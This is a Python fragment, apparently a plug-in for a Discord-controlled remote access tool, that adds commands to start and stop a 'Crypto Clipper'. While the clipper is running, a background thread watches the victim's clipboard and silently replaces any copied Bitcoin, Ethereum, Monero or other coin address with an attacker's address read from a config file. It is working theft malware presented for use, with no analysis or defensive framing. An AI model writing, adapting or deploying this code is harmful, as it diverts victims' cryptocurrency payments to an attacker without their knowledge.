import pyperclip
import re
import os
import json
import threading
# end of imports

# on message
elif message.content == '.start-clipper':
    await message.channel.send("`Crypto Clipper started.`")
    clipper_stop = False
    script_dir = os.path.dirname(os.path.abspath(__file__))
    config_path = os.path.join(script_dir, 'crypto_clipper.json')
    with open(config_path) as f:
        addresses = json.load(f)

    def match():
        clipboard = str(pyperclip.paste())
        btc_match = re.match("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}|^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", clipboard)
        eth_match = re.match("^0x[a-zA-F0-9]{40}$", clipboard)
        doge_match = re.match("^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$", clipboard)
        ltc_match = re.match("^([LM3]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}||ltc1[a-z0-9]{39,59})$", clipboard)
        xmr_match = re.match("^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$", clipboard)
        bch_match = re.match("^((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}$", clipboard)
        dash_match = re.match("^X[1-9A-HJ-NP-Za-km-z]{33}$", clipboard)
        trx_match = re.match("^T[A-Za-z1-9]{33}$", clipboard)

        for currency, address in addresses.items():
            if eval(f'{currency.lower()}_match'):
                if address and address != clipboard:
                    pyperclip.copy(address)
                break

    def wait_for_paste():
        while not clipper_stop:
            pyperclip.waitForNewPaste()
            match()

    # Start thread
    thread = threading.Thread(target=wait_for_paste)
    thread.start()

# on message
elif message.content == '.stop-clipper':
    await message.channel.send("`Crypto Clipper stopped.`")
    clipper_stop = True
    thread.join()
